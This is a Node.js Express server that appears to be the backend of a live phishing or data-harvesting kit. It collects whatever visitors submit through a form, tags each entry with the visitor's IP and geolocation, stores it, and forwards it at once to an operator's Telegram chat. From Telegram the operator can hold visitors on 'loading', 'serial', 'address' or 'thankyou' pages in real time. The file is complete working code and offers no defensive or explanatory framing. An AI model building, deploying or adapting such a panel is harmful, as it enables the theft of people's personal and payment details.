import express from "express";
import cors from "cors";
import fetch from "node-fetch";
import dotenv from "dotenv";
import fs from "fs";
import path from "path";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
// Serve a dynamic config JS so frontend can include it directly from the backend.
// Example usage from static frontend:
//   <script src="https://your-backend.example.com/config.js"></script>
app.get('/config.js', (req, res) => {
	const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'https').replace(/https?:\/\//, '');
	const host = req.headers.host || req.hostname || 'localhost:3000';
	const backendUrl = `${req.headers['x-forwarded-proto'] || req.protocol || 'https'}://${host}`;
	res.type('application/javascript');
	res.send(`window.BACKEND = '${backendUrl}';`);
});

app.use(express.static(path.join(process.cwd(), 'public')));

const DATA_FILE = path.join(process.cwd(), 'submissions.json');
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || null;

let acceptingSubmissions = true;
let forcedPage = null;
let submitDelayMs = parseInt(process.env.SUBMIT_DELAY_MS || '3000', 10) || 3000;
const lastSubmissionAt = new Map();
let submissions = [];

async function loadSubmissions() {
	try {
		const raw = await fs.promises.readFile(DATA_FILE, 'utf8');
		submissions = JSON.parse(raw || '[]');
	} catch (e) {
		submissions = [];
	}
}

async function saveSubmissions() {
	try {
		await fs.promises.writeFile(DATA_FILE, JSON.stringify(submissions, null, 2), 'utf8');
	} catch (e) {
		console.error('saveSubmissions failed', e);
	}
}

async function sendMessage(chatId, text, opts = {}) {
	if (!BOT_TOKEN) {
		console.warn('BOT_TOKEN not configured; skipping sendMessage');
		return null;
	}
	const body = Object.assign({ chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true }, opts);
	try {
		const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
			method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
		});
		return await r.json();
	} catch (e) {
		console.error('sendMessage error', e);
		return null;
	}
}

async function sendToTelegram(text) {
	if (!ADMIN_CHAT_ID && !process.env.TELEGRAM_CHAT_ID && !process.env.CHAT_ID) return null;
	const target = ADMIN_CHAT_ID;
	return sendMessage(target, text);
}

function getAdminKeyboard() {
	return {
		inline_keyboard: [
			[
				{ text: 'Status', callback_data: 'status' },
				{ text: 'Enable', callback_data: 'enable' },
				{ text: 'Disable', callback_data: 'disable' }
			],
			[
				{ text: 'Page: page1', callback_data: 'setpage page1' },
				{ text: 'Page: loading', callback_data: 'setpage loading' },
				{ text: 'Page: serial', callback_data: 'setpage serial' }
			],
			[
				{ text: 'Page: address', callback_data: 'setpage address' },
				{ text: 'Page: thankyou', callback_data: 'setpage thankyou' },
				{ text: 'Clear page', callback_data: 'setpage none' }
			]
		]
	};
}

async function sendAdminControls(chatId) {
	return sendMessage(chatId, 'Admin controls', { reply_markup: getAdminKeyboard() });
}

async function getIpInfo(ip) {
	try {
		const url = ip === '127.0.0.1' || ip === '::1' ? 'https://ipapi.co/json/' : `https://ipapi.co/${encodeURIComponent(ip)}/json/`;
		const r = await fetch(url, { timeout: 3000 });
		const j = await r.json();
		return j || {};
	} catch (e) {
		return {};
	}
}

function getClientIp(req) {
	const raw = (req.headers['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress || 'unknown';
	return String(raw).replace(/^::ffff:/, '');
}

app.post('/submit', async (req, res) => {
	try {
		if (!acceptingSubmissions) {
			res.status(503).json({ error: 'Submissions are disabled by admin.' });
			await sendToTelegram(`<b>Blocked submission attempt</b>\nIP: ${getClientIp(req)}`);
			return;
		}

		const ip = getClientIp(req);
		const last = lastSubmissionAt.get(ip) || 0;
		const now = Date.now();
		if (now - last < submitDelayMs) {
			res.status(429).json({ error: `Please wait ${Math.ceil((submitDelayMs - (now - last)) / 1000)}s before submitting again.` });
			return;
		}

		if (!req.body || Object.keys(req.body).length === 0) {
			res.status(400).json({ error: 'Empty submission body.' });
			return;
		}

		const info = await getIpInfo(ip);
		const entry = {
			timestamp: new Date().toISOString(), ip, geo: { city: info.city || null, region: info.region || null, postal: info.postal || null }, data: req.body
		};

		submissions.push(entry);
		await saveSubmissions();
		lastSubmissionAt.set(ip, now);

		const pretty = `New submission:\n<pre>${JSON.stringify(entry, null, 2)}</pre>`;
		if (ADMIN_CHAT_ID) {
			try {
				await sendMessage(ADMIN_CHAT_ID, pretty, { reply_markup: getAdminKeyboard() });
			} catch (e) {
				console.error('Failed to send submission with admin controls', e);
				await sendToTelegram(pretty);
			}
		} else {
			await sendToTelegram(pretty);
		}

		res.json({ ok: true });
	} catch (err) {
		console.error('/submit handler failed', err);
		res.status(500).json({ error: 'Internal server error' });
	}
});

app.get('/config', (req, res) => {
	res.json({ acceptingSubmissions, forcedPage, submitDelayMs });
});

app.get('/health', (req, res) => {
	res.json({ ok: true, uptime: process.uptime() });
});

function requireAdminToken(req, res, next) {
	const auth = (req.headers.authorization || '').trim();
	if (ADMIN_TOKEN) {
		if (auth === `Bearer ${ADMIN_TOKEN}` || req.query.token === ADMIN_TOKEN) return next();
		return res.status(401).json({ error: 'Unauthorized' });
	}
	const ip = req.ip || req.connection?.remoteAddress || '';
	if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.0.0.1') || req.hostname === 'localhost') return next();
	return res.status(403).json({ error: 'ADMIN_TOKEN not configured; access restricted to localhost' });
}

app.get('/admin/status', requireAdminToken, (req, res) => {
	res.json({ acceptingSubmissions, forcedPage, submitDelayMs, submissionsCount: submissions.length });
});

app.post('/admin/setpage', requireAdminToken, (req, res) => {
	const { page } = req.body || {};
	if (!['page1', 'loading', 'serial', 'address', 'thankyou', 'none'].includes(page)) return res.status(400).json({ error: 'invalid page' });
	forcedPage = page === 'none' ? null : page;
	res.json({ ok: true, forcedPage });
});

app.post('/admin/enable', requireAdminToken, (req, res) => { acceptingSubmissions = true; res.json({ ok: true }); });
app.post('/admin/disable', requireAdminToken, (req, res) => { acceptingSubmissions = false; res.json({ ok: true }); });
app.post('/admin/setdelay', requireAdminToken, (req, res) => {
	const { ms } = req.body || {};
	const v = parseInt(ms, 10);
	if (isNaN(v) || v < 0) return res.status(400).json({ error: 'invalid ms' });
	submitDelayMs = v;
	res.json({ ok: true, submitDelayMs });
});

app.get('/admin/submissions', requireAdminToken, (req, res) => {
	res.json({ ok: true, submissions: submissions.slice(-100) });
});

app.post('/telegram_controls_trigger', requireAdminToken, async (req, res) => {
	const r = await sendAdminControls(ADMIN_CHAT_ID);
	res.json({ ok: true, result: r });
});

app.post('/admin/set_webhook', requireAdminToken, async (req, res) => {
	const { url } = req.body || {};
	if (!BOT_TOKEN) return res.status(500).json({ error: 'BOT_TOKEN not configured' });
	if (!url) return res.status(400).json({ error: 'url required' });
	try {
		const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(url)}`);
		const j = await r.json();
		return res.json(j);
	} catch (e) {
		console.error('set_webhook failed', e);
		return res.status(500).json({ error: e.message });
	}
});

app.get('/admin/get_webhook_info', requireAdminToken, async (req, res) => {
	if (!BOT_TOKEN) return res.status(500).json({ error: 'BOT_TOKEN not configured' });
	try {
		const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getWebhookInfo`);
		const j = await r.json();
		return res.json(j);
	} catch (e) {
		console.error('get_webhook_info failed', e);
		return res.status(500).json({ error: e.message });
	}
});

app.post('/telegram_webhook', (req, res) => {
	const update = req.body;
	res.sendStatus(200);

	(async function processUpdate(u) {
		try {
			console.log('Processing Telegram update (async)...', u && (u.callback_query ? 'callback_query' : (u.message ? 'message' : 'other')));

			if (u.callback_query) {
				const cb = u.callback_query;
				const fromId = cb.from.id;
				const data = (cb.data || '').trim();
				const allowedAdmin = String(fromId) === String(ADMIN_CHAT_ID);

				async function answerCb(text) {
					try {
						await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
							method: 'POST', headers: { 'Content-Type': 'application/json' },
							body: JSON.stringify({ callback_query_id: cb.id, text: text || '', show_alert: false })
						});
					} catch (e) {
						console.error('answerCallbackQuery failed', e);
					}
				}

				await answerCb();
				if (!allowedAdmin) {
					await sendMessage(cb.from.id, 'Unauthorized');
					return;
				}

				const parts = data.split(' ');
				const cmd = parts[0];
				if (cmd === 'setpage') {
					const page = parts[1] || '';
					if (['page1', 'loading', 'serial', 'address', 'thankyou', 'none'].includes(page)) {
						forcedPage = page === 'none' ? null : page;
						await sendMessage(ADMIN_CHAT_ID, `forcedPage set to ${forcedPage}`);
						await answerCb(`forcedPage set to ${forcedPage}`);
					} else {
						await sendMessage(ADMIN_CHAT_ID, 'Invalid page');
						await answerCb('Invalid page');
					}
				} else if (cmd === 'enable') {
					acceptingSubmissions = true;
					await sendMessage(ADMIN_CHAT_ID, 'Submissions enabled.');
					await answerCb('Submissions enabled');
				} else if (cmd === 'disable') {
					acceptingSubmissions = false;
					await sendMessage(ADMIN_CHAT_ID, 'Submissions disabled.');
					await answerCb('Submissions disabled');
				} else if (cmd === 'status') {
					await sendMessage(ADMIN_CHAT_ID, `<pre>${JSON.stringify({ acceptingSubmissions, forcedPage, submitDelayMs, submissionsCount: submissions.length }, null, 2)}</pre>`);
					await answerCb('Status sent');
				} else {
					await sendMessage(ADMIN_CHAT_ID, 'Unknown action');
					await answerCb('Unknown action');
				}

				return;
			}

			const msg = u.message || u.channel_post;
			if (!msg) return;

			const chatId = msg.chat.id;
			const text = (msg.text || '').trim();
			const allowedAdmin = String(chatId) === String(ADMIN_CHAT_ID);
			if (!allowedAdmin) {
				await sendMessage(chatId, 'Unauthorized: you are not allowed to run admin commands.');
				return;
			}

			if (text.startsWith('/controls')) {
				await sendAdminControls(chatId);
			} else if (text.startsWith('/release')) {
				forcedPage = 'serial';
				await sendMessage(chatId, 'Released to serial (forcedPage=serial)');
			} else if (text.startsWith('/enable')) {
				acceptingSubmissions = true;
				await sendMessage(chatId, 'Submissions enabled.');
			} else if (text.startsWith('/setpage')) {
				const parts = text.split(' ');
				const page = parts[1] || '';
				if (['page1', 'loading', 'serial', 'address', 'thankyou', 'none'].includes(page)) {
					forcedPage = page === 'none' ? null : page;
					await sendMessage(chatId, `forcedPage set to ${forcedPage}`);
				} else {
					await sendMessage(chatId, 'Usage: /setpage <page1|loading|serial|address|thankyou|none>');
				}
			} else if (text.startsWith('/status')) {
				await sendMessage(chatId, `<pre>${JSON.stringify({ acceptingSubmissions, forcedPage, submitDelayMs, submissionsCount: submissions.length }, null, 2)}</pre>`);
			} else if (text.startsWith('/setdelay')) {
				const parts = text.split(' ');
				const v = parseInt(parts[1], 10);
				if (!isNaN(v) && v >= 0) {
					submitDelayMs = v;
					await sendMessage(chatId, `submitDelayMs set to ${submitDelayMs}ms`);
				} else {
					await sendMessage(chatId, 'Usage: /setdelay <milliseconds>');
				}
			} else if (text.startsWith('/disable')) {
				acceptingSubmissions = false;
				await sendMessage(chatId, 'Submissions disabled.');
			} else if (text.startsWith('/count')) {
				await sendMessage(chatId, `Total submissions: ${submissions.length}`);
			} else if (text.startsWith('/last')) {
				const last = submissions.slice(-1)[0];
				await sendMessage(chatId, last ? `<pre>${JSON.stringify(last, null, 2)}</pre>` : 'No submissions yet.');
			} else if (text.startsWith('/help')) {
				await sendMessage(chatId, 'Commands: /controls /enable /disable /count /last /setpage /status');
			} else {
				await sendMessage(chatId, 'Unknown command. Use /help');
			}
		} catch (err) {
			console.error('Error processing Telegram update', err);
		}
	})(update);
});

const server = app.listen(PORT, () => {
	loadSubmissions().then(() => console.log(`Loaded ${submissions.length} submissions`)).catch(() => {});
	console.log(`Server listening on ${PORT}`);
});

process.on('unhandledRejection', (err) => { console.error('Unhandled Rejection:', err); });
process.on('SIGINT', () => { console.log('Shutting down...'); server.close(() => process.exit(0)); });


